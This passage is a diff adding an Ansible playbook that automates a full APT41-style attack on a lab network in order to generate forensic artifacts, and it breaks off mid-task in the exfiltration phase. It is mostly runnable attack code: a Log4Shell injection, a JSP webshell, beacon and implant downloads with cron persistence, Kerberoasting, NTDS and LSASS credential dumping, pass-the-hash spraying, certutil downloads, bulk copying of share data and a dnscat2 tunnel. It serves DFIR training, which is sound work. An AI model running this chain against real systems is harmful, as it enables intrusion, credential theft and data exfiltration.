@@ -1,0 +1,1092 @@
+---
+# Operation DragonRx — Automated Full Attack Simulation
+# Purpose : DFIR artifact generation — real tools, real commands, full APT41 kill chain
+# Run from : /home/andrey/dragonrx-lab/
+# Usage   : ansible-playbook -i ansible/inventory/hosts.ini ansible/playbooks/attack.yml
+#
+# NETWORK MAP
+#   10.0.0.5   / 192.168.10.5    kali        — dual-homed attacker
+#   10.0.0.10                    sliver_c2   — C2 HTTP :80  HTTPS :443
+#   10.0.0.20                    jndi        — marshalsec LDAP :1389
+#   10.0.0.100 / 192.168.10.100  web01       — Tomcat 9 + log4j 2.14.1
+#   192.168.10.10                DC01        — Windows Server 2019 (novatech.local DC)
+#   192.168.10.20                FS01        — Windows Server 2019 (file server)
+#   192.168.10.50                WS01        — Windows 10 22H2
+#
+# STAGING SERVER: Kali python3 http.server on port 8900 → /opt/tools/
+#   Linux targets  → http://10.0.0.5:8900/<path>
+#   Windows targets → http://192.168.10.5:8900/<path>  (target_net NIC)
+#
+# DC01 Sliver beacon: dc01_http.exe (HTTP→:80) — avoids HTTPS cert mismatch
+
+# ============================================================================
+# PREFLIGHT — verify lab is up before running attack
+# ============================================================================
+
+- name: "PREFLIGHT — verify lab is up"
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - name: "PRE | JNDI relay running"
+      shell: |
+        docker inspect dragonrx_jndi 2>/dev/null \
+          | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d[0]['State']['Running']).lower())"
+      register: jndi_state
+      failed_when: "'true' not in jndi_state.stdout"
+
+    - name: "PRE | Sliver C2 running"
+      shell: |
+        docker inspect dragonrx_c2 2>/dev/null \
+          | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d[0]['State']['Running']).lower())"
+      register: c2_state
+      failed_when: "'true' not in c2_state.stdout"
+
+    - name: "PRE | web01 HTTP responding"
+      shell: |
+        curl -sf --max-time 5 \
+          -H 'X-Api-Version: preflight' \
+          http://10.0.0.100:8080/ || true
+      register: web01_check
+
+    - name: "PRE | DC01 WinRM reachable"
+      shell: nc -z -w3 192.168.10.10 5985 && echo reachable
+      register: dc01_winrm
+      ignore_errors: true
+
+    - name: "PRE | WS01 WinRM reachable"
+      shell: nc -z -w3 192.168.10.50 5985 && echo reachable
+      register: ws01_winrm
+      ignore_errors: true
+
+    - name: "PRE | Preflight results"
+      debug:
+        msg:
+          - "JNDI  : {{ jndi_state.stdout | trim }}"
+          - "C2    : {{ c2_state.stdout | trim }}"
+          - "DC01  : {{ dc01_winrm.stdout | default('unreachable') }}"
+          - "WS01  : {{ ws01_winrm.stdout | default('unreachable') }}"
+
+# ============================================================================
+# PHASE 0 — Reconnaissance   ATT&CK: T1595.002, T1592.002
+# ============================================================================
+
+- name: "PHASE 0 — Reconnaissance"
+  hosts: kali
+  gather_facts: false
+  tasks:
+    - name: "P0 | Create loot directories"
+      file:
+        path: "{{ item }}"
+        state: directory
+        mode: "0755"
+      loop:
+        - /opt/loot
+        - /opt/loot/recon
+
+    - name: "P0.1 | nmap — service/version scan on web01:8080"
+      shell: |
+        nmap -sV -sC -p 8080 10.0.0.100 \
+          -oA /opt/loot/recon/web01_scan 2>/dev/null
+      ignore_errors: true
+
+    - name: "P0.2 | whatweb — web technology fingerprint"
+      shell: |
+        whatweb http://10.0.0.100:8080 -v 2>/dev/null \
+          | tee /opt/loot/recon/whatweb.txt
+      ignore_errors: true
+
+    - name: "P0.3 | Raw response headers — confirm JSON API + no Server header"
+      shell: |
+        curl -s -o /dev/null -D - http://10.0.0.100:8080/ \
+          | grep -iE 'server|x-powered|content-type'
+      register: headers
+      ignore_errors: true
+
+    - name: "P0.4 | Probe X-Api-Version header — confirm injection vector"
+      shell: |
+        curl -sv \
+          -H 'X-Api-Version: recon-probe' \
+          http://10.0.0.100:8080/ 2>&1 \
+          | grep -E '< HTTP|Content-Type'
+      ignore_errors: true
+
+# ============================================================================
+# PHASE 1 — Initial Access — Log4Shell CVE-2021-44228   ATT&CK: T1190
+# ============================================================================
+
+- name: "PHASE 1 — Initial Access (Log4Shell CVE-2021-44228)"
+  hosts: localhost
+  gather_facts: false
+  tasks:
+    - name: "P1.0 | Verify JNDI relay status"
+      shell: docker logs dragonrx_jndi 2>&1 | tail -6
+      register: jndi_ready
+
+    - name: "P1.0 | Assert JNDI relay is listening"
+      assert:
+        that: "'Listening on' in jndi_ready.stdout or 'ldap' in jndi_ready.stdout | lower"
+        fail_msg: "dragonrx_jndi not ready — run: docker compose up -d jndi_server"
+
+    - name: "P1.1 | Start nc reverse shell listener on Kali (background — creates socket artifact)"
+      shell: |
+        docker exec -d dragonrx_kali bash -c \
+          'nohup nc -lvnp 4444 >/tmp/revshell_output.txt 2>&1 &'
+      ignore_errors: true
+
+    - name: "P1.2 | Fire Log4Shell — inject JNDI lookup via X-Api-Version header"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'curl -s http://10.0.0.100:8080/ \
+            -H "X-Api-Version: \${jndi:ldap://10.0.0.20:1389/Exploit}" \
+            --max-time 8 || true'
+      # DFIR: Tomcat access.log — GET / with ${jndi:ldap://...} in X-Api-Version
+      # DFIR: LDAP conn from web01 → dragonrx_jndi:1389
+      # DFIR: HTTP GET web01 → dragonrx_jndi:8080/Exploit.class
+      # DFIR: Process event — java spawning /bin/bash (Wazuh CRITICAL)
+      # DFIR: Zeek http.log — JNDI string in header (Zeek CRITICAL)
+
+    - name: "P1.3 | Wait — JVM downloads + executes Exploit.class, bash spawns"
+      pause:
+        seconds: 6
+
+    - name: "P1.4 | Confirm JNDI relay received callback"
+      shell: docker logs dragonrx_jndi 2>&1 | tail -6
+      register: jndi_callback
+
+    - debug:
+        msg: "JNDI callback: {{ jndi_callback.stdout_lines }}"
+
+    - name: "P1.5 | Kill nc listener — webshell replaces fragile reverse shell"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'pkill -f "nc -lvnp 4444" 2>/dev/null || true'
+      ignore_errors: true
+
+# ============================================================================
+# PHASE 2 — Foothold: Webshell + Sliver Beacon + RxPhage
+# ATT&CK: T1505.003, T1059.004, T1053.003
+# ============================================================================
+
+- name: "PHASE 2a — Deploy JSP Webshell on web01"
+  hosts: web01
+  gather_facts: false
+  tasks:
+    - name: "P2.1 | Create plausible static resource directory path"
+      file:
+        path: /opt/tomcat/webapps/ROOT/resources/imgs
+        state: directory
+        mode: "0755"
+
+    - name: "P2.2 | Write China Chopper-pattern JSP webshell"
+      copy:
+        dest: /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp
+        mode: "0644"
+        content: |
+          <%@page import="java.util.*,java.io.*"%><%
+          String cmd = request.getParameter("c");
+          if(cmd != null && !cmd.isEmpty()) {
+              Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
+              BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+              StringBuilder sb = new StringBuilder();
+              String line;
+              while((line = br.readLine()) != null) sb.append(line).append("\n");
+              out.print(sb.toString());
+          }
+          %>
+      # DFIR: Wazuh file-integrity alert — JSP created in Tomcat webroot (HIGH)
+
+- name: "PHASE 2b — Start C2 listeners + staging + deploy implants"
+  hosts: localhost
+  gather_facts: false
+  vars:
+    webshell: "http://10.0.0.100:8080/resources/imgs/cache.jsp"
+  tasks:
+    - name: "P2.3 | Ensure Sliver HTTP listener is running (port 80)"
+      shell: |
+        docker exec -i dragonrx_c2 bash -c "
+          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
+          printf 'http --lhost 0.0.0.0 --lport 80\nexit\n' \
+            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1 | tail -5 || true
+        "
+      ignore_errors: true
+
+    - name: "P2.4 | Ensure Sliver HTTPS listener is running (port 443)"
+      shell: |
+        docker exec -i dragonrx_c2 bash -c "
+          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
+          printf 'https --lhost 0.0.0.0 --lport 443\nexit\n' \
+            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1 | tail -5 || true
+        "
+      ignore_errors: true
+
+    - name: "P2.5 | Start staging HTTP server on Kali (port 8900 → /opt/tools/)"
+      shell: |
+        docker exec dragonrx_kali bash -c '
+          fuser -k 8900/tcp 2>/dev/null || true
+          sleep 1
+          nohup python3 -m http.server 8900 --directory /opt/tools/ \
+            >/tmp/staging.log 2>&1 &
+          sleep 2
+          pgrep -f "http.server 8900" && echo STAGING_OK
+        '
+      register: staging_start
+      failed_when: "'STAGING_OK' not in staging_start.stdout"
+
+    - name: "P2.6 | Confirm webshell responds"
+      shell: |
+        curl -sf "{{ webshell }}" --data-urlencode "c=id" --max-time 5 \
+          || echo WEBSHELL_NOT_RESPONDING
+      register: webshell_probe
+
+    - debug:
+        msg: "Webshell: {{ webshell_probe.stdout }}"
+
+    - name: "P2.7 | Download Sliver HTTP beacon via webshell (JVM spawns wget — DFIR artifact)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 30 \
+          --data-urlencode \
+          'c=mkdir -p /tmp/.cache && wget -q http://10.0.0.5:8900/rxphage/dragonrx_beacon -O /tmp/.cache/dragonrx_beacon && chmod +x /tmp/.cache/dragonrx_beacon && echo BEACON_DOWNLOADED'
+      register: beacon_dl
+      failed_when: "'BEACON_DOWNLOADED' not in beacon_dl.stdout"
+      # DFIR: Tomcat access.log — GET /resources/imgs/cache.jsp?c=wget... (HIGH)
+      # DFIR: Wazuh — Tomcat spawning wget from /tmp
+
+    - name: "P2.8 | Launch Sliver beacon on web01 (nohup — detached from webshell session)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 15 \
+          --data-urlencode \
+          'c=nohup /tmp/.cache/dragonrx_beacon >/dev/null 2>&1 & sleep 2 && pgrep -f dragonrx_beacon && echo BEACON_RUNNING'
+      register: beacon_launch
+      # DFIR: Wazuh — executable launched from /tmp (HIGH)
+      # DFIR: Zeek conn.log — outbound HTTP to 10.0.0.10:80 every 30s
+
+    - name: "P2.9 | Deploy RxPhage implant (PlugX-pattern) + cron @reboot persistence"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 30 \
+          --data-urlencode \
+          'c=wget -q http://10.0.0.5:8900/rxphage/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage && (crontab -l 2>/dev/null; echo "@reboot /tmp/.cache/rxphage") | crontab - && nohup /tmp/.cache/rxphage >/dev/null 2>&1 & echo RXPHAGE_DEPLOYED'
+      register: rxphage_deploy
+      # DFIR: Zeek dns.log — NXDOMAIN for updates.oracle-cdn.com (MEDIUM)
+
+    - name: "P2.10 | Wait for Sliver beacon initial check-in"
+      pause:
+        seconds: 36
+
+    - name: "P2.11 | Confirm beacon registered in Sliver"
+      shell: |
+        docker exec -i dragonrx_c2 bash -c "
+          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
+          printf 'beacons\nexit\n' \
+            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1
+        "
+      register: sliver_beacons
+      ignore_errors: true
+
+    - debug:
+        msg: "Sliver beacons: {{ sliver_beacons.stdout_lines }}"
+
+    - name: "P2.12 | Verify both implants running on web01"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=ps aux | grep -E "dragonrx_beacon|rxphage" | grep -v grep'
+      register: implants_ps
+
+    - debug:
+        msg: "Running implants: {{ implants_ps.stdout_lines }}"
+
+# ============================================================================
+# PHASE 3 — Discovery
+# ATT&CK: T1046, T1082, T1087.002, T1069.002, T1552.001
+# ============================================================================
+
+- name: "PHASE 3 — Discovery"
+  hosts: localhost
+  gather_facts: false
+  vars:
+    webshell: "http://10.0.0.100:8080/resources/imgs/cache.jsp"
+  tasks:
+    - name: "P3.1 | Host info — id, hostname, uname (via webshell)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=id; whoami; hostname; uname -a; head -3 /etc/os-release'
+      register: host_info
+
+    - name: "P3.2 | Network interfaces — confirm dual-homed eth0+eth1"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=ip addr show'
+      register: net_ifaces
+
+    - name: "P3.3 | Routing table — discover 192.168.10.0/24 internal segment"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=ip route show'
+      register: routes
+
+    - name: "P3.4 | Active connections (what is web01 already talking to)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=ss -antup | grep -v 127.0.0.1'
+      register: connections
+
+    - name: "P3.5 | /proc/1/environ — credential discovery in JVM environment (T1552.001)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 10 \
+          --data-urlencode 'c=cat /proc/1/environ | tr "\0" "\n" | sort'
+      register: environ_dump
+      # CRITICAL: LDAP_USER=svc_ldap / LDAP_PASS=NovaTech2021! in plain text
+
+    - name: "P3.5 | Discovered credentials from environment"
+      debug:
+        msg: "{{ environ_dump.stdout_lines | select('match', '.*(LDAP|DOMAIN|PASS|CRED).*') | list }}"
+
+    - name: "P3.6 | Internal network ping sweep — 192.168.10.0/24 (T1046)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 120 \
+          --data-urlencode 'c=for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo 192.168.10.$i UP) & done; wait'
+      register: ping_sweep
+      ignore_errors: true
+      # DFIR: Zeek conn.log — sequential ICMP from 192.168.10.100 (MEDIUM)
+
+    - name: "P3.6 | Live hosts"
+      debug:
+        msg: "{{ ping_sweep.stdout_lines | select('match', '.*UP') | list }}"
+
+    - name: "P3.7 | Port scan Windows targets from Kali — map services (T1046)"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
+           192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null \
+           | tee /opt/loot/recon/windows_portscan.txt'
+      register: nmap_win
+      ignore_errors: true
+
+    - name: "P3.8 | Enumerate domain users via GetADUsers (T1087.002)"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'impacket-GetADUsers novatech.local/svc_ldap:"NovaTech2021!" \
+           -dc-ip 192.168.10.10 -all 2>/dev/null \
+           | tee /opt/loot/recon/domain_users.txt'
+      register: ldap_users
+      ignore_errors: true
+
+    - name: "P3.9 | LDAP — find Kerberoastable accounts (SPN-registered) (T1069.002)"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'ldapsearch -x \
+            -H ldap://192.168.10.10 \
+            -D svc_ldap@novatech.local \
+            -w "NovaTech2021!" \
+            -b dc=novatech,dc=local \
+            "(&(objectClass=user)(servicePrincipalName=*))" \
+            sAMAccountName servicePrincipalName memberOf 2>/dev/null \
+            | grep -E "^sAMAccountName|^servicePrincipalName|^memberOf"'
+      register: spn_users
+      ignore_errors: true
+
+    - name: "P3.9 | Kerberoastable accounts"
+      debug:
+        msg: "{{ spn_users.stdout_lines }}"
+
+    - name: "P3.10 | LDAP — enumerate Domain Admins group (T1087.002)"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'ldapsearch -x \
+            -H ldap://192.168.10.10 \
+            -D svc_ldap@novatech.local \
+            -w "NovaTech2021!" \
+            -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
+            member 2>/dev/null | grep "^member:"'
+      register: domain_admins
+      ignore_errors: true
+
+    - name: "P3.10 | Domain Admins"
+      debug:
+        msg: "{{ domain_admins.stdout_lines }}"
+
+# ============================================================================
+# PHASE 4 — Credential Access
+# ATT&CK: T1558.003, T1003.001, T1003.003
+# ============================================================================
+
+- name: "PHASE 4 — Credential Access"
+  hosts: kali
+  gather_facts: false
+  tasks:
+    - name: "P4.1 | Kerberoast — request TGS for SPN-registered accounts (T1558.003)"
+      shell: |
+        impacket-GetUserSPNs \
+          novatech.local/svc_ldap:'NovaTech2021!' \
+          -dc-ip 192.168.10.10 \
+          -request \
+          -outputfile /opt/loot/kerberoast_hashes.txt 2>&1
+      register: kerberoast_out
+      ignore_errors: true
+      # DFIR: Windows EID 4769 — Kerberos TGS requested for svc_backup (MEDIUM)
+
+    - debug:
+        msg: "{{ kerberoast_out.stdout_lines }}"
+
+    - name: "P4.2 | Crack Kerberoast hash with john (krb5-18 = AES256)"
+      shell: |
+        gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
+        john /opt/loot/kerberoast_hashes.txt \
+          --wordlist=/usr/share/wordlists/rockyou.txt \
+          --format=krb5-18 2>&1
+        echo "=== cracked ==="
+        john /opt/loot/kerberoast_hashes.txt --show --format=krb5-18 2>&1
+      register: john_out
+      ignore_errors: true
+
+    - name: "P4.2 | Cracked password"
+      debug:
+        msg: "{{ john_out.stdout_lines }}"
+
+    - name: "P4.3 | Verify svc_backup can authenticate to DC01"
+      shell: |
+        nxc smb 192.168.10.10 \
+          -u svc_backup \
+          -p 'Backup_Svc99!' 2>&1
+      register: svc_backup_auth
+      ignore_errors: true
+
+    - name: "P4.4 | NTDS dump via secretsdump DRSUAPI — all domain hashes (T1003.003)"
+      shell: |
+        impacket-secretsdump \
+          novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
+          -just-dc \
+          > /opt/loot/ntds_dump.txt 2>&1
+      register: secretsdump_run
+      ignore_errors: true
+      # DFIR: EID 4662 — DRSUAPI replication from non-DC (HIGH)
+      # DFIR: Wazuh Behavior:Win32/RegDump.SA / RemoteRegDump.A on DC01
+
+    - name: "P4.5 | Extract Administrator NTLM hash"
+      shell: |
+        grep "^Administrator:" /opt/loot/ntds_dump.txt | cut -d: -f4
+      register: admin_ntlm
+      ignore_errors: true
+
+    - name: "P4.5 | Extract krbtgt hash (Golden Ticket capability)"
+      shell: |
+        grep "^krbtgt:" /opt/loot/ntds_dump.txt | cut -d: -f4
+      register: krbtgt_ntlm
+      ignore_errors: true
+
+    - name: "P4.5 | Save Administrator NTLM hash to loot"
+      copy:
+        content: "{{ admin_ntlm.stdout | trim }}"
+        dest: /opt/loot/admin_ntlm.txt
+      when: admin_ntlm.stdout | trim | length > 0
+
+    - name: "P4.5 | Credential summary"
+      debug:
+        msg:
+          - "Administrator NTLM : {{ admin_ntlm.stdout | trim }}"
+          - "krbtgt NTLM        : {{ krbtgt_ntlm.stdout | trim }}"
+
+    - name: "P4.6 | LSASS dump on WS01 via comsvcs MiniDump + smbexec (T1003.001)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.50 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'powershell -ep bypass -c "$l=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll,MiniDump $l C:\Temp\lsass.dmp full; Start-Sleep 3"' \
+          2>&1
+      register: lsass_dump_run
+      ignore_errors: true
+      # DFIR: Sysmon EID 10 — ProcessAccess: rundll32.exe → lsass.exe (CRITICAL)
+
+    - name: "P4.6 | Wait for LSASS dump to flush"
+      pause:
+        seconds: 8
+
+    - name: "P4.7 | Download LSASS dump from WS01 via smbclient"
+      shell: |
+        cd /opt/loot && \
+        smbclient //192.168.10.50/C$ \
+          -U 'NOVATECH/Administrator%NovaTech_Admin2024!' \
+          -c 'cd Temp; get lsass.dmp' 2>&1
+      register: lsass_dl
+      ignore_errors: true
+
+    - name: "P4.8 | Parse LSASS dump with pypykatz — extract NTLM hashes"
+      shell: |
+        pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null \
+          | grep -A 8 "== MSV ==" | head -30
+      register: pypykatz_out
+      ignore_errors: true
+
+    - name: "P4.8 | pypykatz output"
+      debug:
+        msg: "{{ pypykatz_out.stdout_lines }}"
+
+# ============================================================================
+# PHASE 5 — Lateral Movement
+# ATT&CK: T1021.002, T1047, T1550.002
+# ============================================================================
+
+- name: "PHASE 5 — Lateral Movement"
+  hosts: kali
+  gather_facts: false
+  tasks:
+    - name: "P5.1 | Verify jsmith has local admin on WS01 (Pwn3d! check)"
+      shell: |
+        nxc smb 192.168.10.50 \
+          -u jsmith \
+          -p 'Research#2024' 2>&1
+      register: jsmith_check
+      ignore_errors: true
+
+    - name: "P5.2 | Lateral movement WEB01 → WS01 via smbexec as jsmith (T1021.002)"
+      shell: |
+        nxc smb 192.168.10.50 \
+          -u jsmith \
+          -p 'Research#2024' \
+          --exec-method smbexec \
+          -x 'whoami && hostname && net user jsmith /domain 2>&1' \
+          2>&1
+      register: ws01_access
+      ignore_errors: true
+      # DFIR: EID 4624 LogonType 3 — NTLM network logon from 192.168.10.5 (HIGH)
+      # DFIR: EID 4697 — service installed (smbexec randomised service name) (HIGH)
+
+    - name: "P5.2 | WS01 access"
+      debug:
+        msg: "{{ ws01_access.stdout_lines }}"
+
+    - name: "P5.3 | PtH — spray Administrator NTLM across all Windows hosts (T1550.002)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.0/24 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          -x "whoami" 2>&1
+      register: pth_spray
+      ignore_errors: true
+      # DFIR: EID 4624 LogonType 3 on DC01+FS01+WS01 — NTLM PtH auth (HIGH)
+
+    - name: "P5.3 | PtH spray result"
+      debug:
+        msg: "{{ pth_spray.stdout_lines }}"
+
+    - name: "P5.4 | Lateral movement → DC01 via PtH smbexec (T1550.002)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.10 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'whoami && hostname && net group "Domain Admins" /domain 2>&1' \
+          2>&1
+      register: dc01_access
+      ignore_errors: true
+
+    - name: "P5.4 | DC01 access"
+      debug:
+        msg: "{{ dc01_access.stdout_lines }}"
+
+    - name: "P5.5 | WMI remote execution on WS01 — quieter than smbexec (T1047)"
+      shell: |
+        impacket-wmiexec \
+          novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
+          'whoami /all' 2>&1
+      register: wmi_exec
+      ignore_errors: true
+      # DFIR: DCOM RPC on 135 + dynamic high port — fewer host artifacts than service-based
+
+    - name: "P5.5 | WMI result"
+      debug:
+        msg: "{{ wmi_exec.stdout_lines }}"
+
+# ============================================================================
+# PHASE 6 — Collection   ATT&CK: T1005, T1074.001, T1560.001, T1105
+# ============================================================================
+
+- name: "PHASE 6 — Collection from FS01"
+  hosts: kali
+  gather_facts: false
+  tasks:
+    - name: "P6.1 | List FS01 shares — confirm crown jewels are exposed"
+      shell: |
+        nxc smb 192.168.10.20 \
+          -u administrator \
+          -p 'NovaTech_Admin2024!' \
+          --shares 2>&1
+      register: fs01_shares
+
+    - debug:
+        msg: "{{ fs01_shares.stdout_lines }}"
+
+    - name: "P6.2 | Exfil Research share — clinical trial data (T1005)"
+      shell: |
+        mkdir -p /opt/loot/Research && cd /opt/loot/Research && \
+        smbclient //192.168.10.20/Research \
+          -U 'NOVATECH/Administrator%NovaTech_Admin2024!' \
+          -c 'recurse ON; prompt OFF; mget *' 2>&1
+      register: research_grab
+      ignore_errors: true
+
+    - name: "P6.3 | Exfil Manufacturing share — synthesis documents (T1005)"
+      shell: |
+        mkdir -p /opt/loot/Manufacturing && cd /opt/loot/Manufacturing && \
+        smbclient //192.168.10.20/Manufacturing \
+          -U 'NOVATECH/Administrator%NovaTech_Admin2024!' \
+          -c 'recurse ON; prompt OFF; mget *' 2>&1
+      register: mfg_grab
+      ignore_errors: true
+
+    - name: "P6.4 | Stage Research data on DC01 via robocopy (Windows LOLBAS — T1074.001)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.10 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'mkdir C:\Temp\archive\Research 2>nul & net use Z: \\192.168.10.20\Research /user:NOVATECH\Administrator NovaTech_Admin2024! & robocopy Z:\ C:\Temp\archive\Research /E /NFL /NDL /NC /NJS /NJH & net use Z: /delete /y' \
+          2>&1
+      register: dc01_stage_r
+      ignore_errors: true
+
+    - name: "P6.5 | Stage Manufacturing data on DC01"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.10 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'mkdir C:\Temp\archive\Manufacturing 2>nul & net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024! & robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH & net use Y: /delete /y' \
+          2>&1
+      register: dc01_stage_m
+      ignore_errors: true
+
+    - name: "P6.6 | Download 7za.exe on DC01 via certutil (LOLBAS — T1105)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.10 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'certutil.exe -urlcache -f http://192.168.10.5:8900/7za.exe C:\Temp\7za.exe' \
+          2>&1
+      register: certutil_7za
+      ignore_errors: true
+      # DFIR: Sysmon EID 1 — certutil with URLCache flag (HIGH)
+
+    - name: "P6.7 | Compress staged data on DC01 with password (T1560.001)"
+      shell: |
+        NTLM=$(cat /opt/loot/admin_ntlm.txt)
+        nxc smb 192.168.10.10 \
+          -u administrator \
+          -H "aad3b435b51404eeaad3b435b51404ee:${NTLM}" \
+          --exec-method smbexec \
+          -x 'C:\Temp\7za.exe a -tzip -pRxPhage2024! -mx9 C:\Temp\data.zip C:\Temp\archive' \
+          2>&1
+      register: dc01_compress
+      ignore_errors: true
+
+    - name: "P6.8 | Compress Kali-side loot (NTDS + lsass + collected files)"
+      shell: |
+        cd /opt/loot && \
+        zip -r -P 'RxPhage2024!' data.zip \
+          Research/ Manufacturing/ ntds_dump.txt admin_ntlm.txt 2>&1
+      ignore_errors: true
+
+# ============================================================================
+# PHASE 7 — Exfiltration   ATT&CK: T1041, T1048.001
+# ============================================================================
+
+- name: "PHASE 7 — Exfiltration"
+  hosts: localhost
+  gather_facts: false
+  vars:
+    webshell: "http://10.0.0.100:8080/resources/imgs/cache.jsp"
+  tasks:
+    - name: "P7.1 | Deploy dc01_http.exe beacon on DC01 via certutil (HTTP — avoids HTTPS cert)"
+      shell: |
+        NTLM=$(cat /home/andrey/dragonrx-lab/attacker/loot/admin_ntlm.txt)
+        docker exec dragonrx_kali bash -c "
+          nxc smb 192.168.10.10 \
+            -u administrator \
+            -H 'aad3b435b51404eeaad3b435b51404ee:${NTLM}' \
+            --exec-method smbexec \
+            -x 'certutil.exe -urlcache -f http://192.168.10.5:8900/rxphage/dc01_http.exe C:\Temp\rxphage.exe' \
+            2>&1
+        "
+      register: dc01_certutil
+      ignore_errors: true
+
+    - debug:
+        msg: "{{ dc01_certutil.stdout_lines }}"
+
+    - name: "P7.2 | Launch rxphage.exe as hidden process on DC01 (detached via Start-Process)"
+      shell: |
+        NTLM=$(cat /home/andrey/dragonrx-lab/attacker/loot/admin_ntlm.txt)
+        docker exec dragonrx_kali bash -c "
+          nxc smb 192.168.10.10 \
+            -u administrator \
+            -H 'aad3b435b51404eeaad3b435b51404ee:${NTLM}' \
+            --exec-method smbexec \
+            -x 'powershell -c \"Start-Process -FilePath C:\Temp\rxphage.exe -WindowStyle Hidden\"' \
+            2>&1
+        "
+      register: dc01_beacon_launch
+      ignore_errors: true
+      # DFIR: Sysmon EID 1 — rxphage.exe spawned with hidden window (CRITICAL)
+      # DFIR: Zeek conn.log — outbound HTTP to 10.0.0.10:80 from 192.168.10.10
+
+    - name: "P7.3 | Wait for DC01 beacon to check in"
+      pause:
+        seconds: 36
+
+    - name: "P7.4 | Verify DC01 beacon in Sliver"
+      shell: |
+        docker exec -i dragonrx_c2 bash -c "
+          CFG=\$(ls /root/.sliver-client/configs/*.cfg 2>/dev/null | head -1)
+          printf 'beacons\nexit\n' \
+            | /usr/local/bin/sliver --config \"\$CFG\" 2>&1
+        "
+      register: dc01_beacons
+      ignore_errors: true
+
+    - debug:
+        msg: "All beacons: {{ dc01_beacons.stdout_lines }}"
+
+    - name: "P7.5 | Primary exfil — download data.zip from DC01 via SMB (T1041)"
+      shell: |
+        docker exec dragonrx_kali bash -c "
+          cd /opt/loot && \
+          smbclient //192.168.10.10/C\$ \
+            -U 'NOVATECH/Administrator%NovaTech_Admin2024!' \
+            -c 'cd Temp; get data.zip dc01_data.zip' 2>&1
+        "
+      register: dc01_exfil
+      ignore_errors: true
+      # DFIR: Zeek files.log — large outbound SMB transfer from DC01 (HIGH)
+
+    - name: "P7.5 | Verify exfil archive"
+      shell: |
+        docker exec dragonrx_kali bash -c \
+          'ls -lh /opt/loot/dc01_data.zip 2>/dev/null || echo ARCHIVE_MISSING'
+      register: exfil_check
+
+    - debug:
+        msg: "{{ exfil_check.stdout }}"
+
+    - name: "P7.6 | Start dnscat2 server on Kali — DNS backup C2 channel (T1048.001)"
+      shell: |
+        docker exec dragonrx_kali bash -c '
+          nohup ruby /usr/share/dnscat2/server/dnscat2.rb \
+            --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
+            --no-cache \
+            --secret=DragonRx2024 \
+            >/tmp/dnscat2.log 2>&1 &
+          sleep 2 && pgrep -f dnscat2 && echo DNSCAT_SERVER_UP
+        '
+      register: dnscat_server
+      ignore_errors: true
+
+    - name: "P7.7 | Deploy dnscat2 client on web01 via webshell (backup channel)"
+      shell: |
+        curl -s "{{ webshell }}" --max-time 20 \
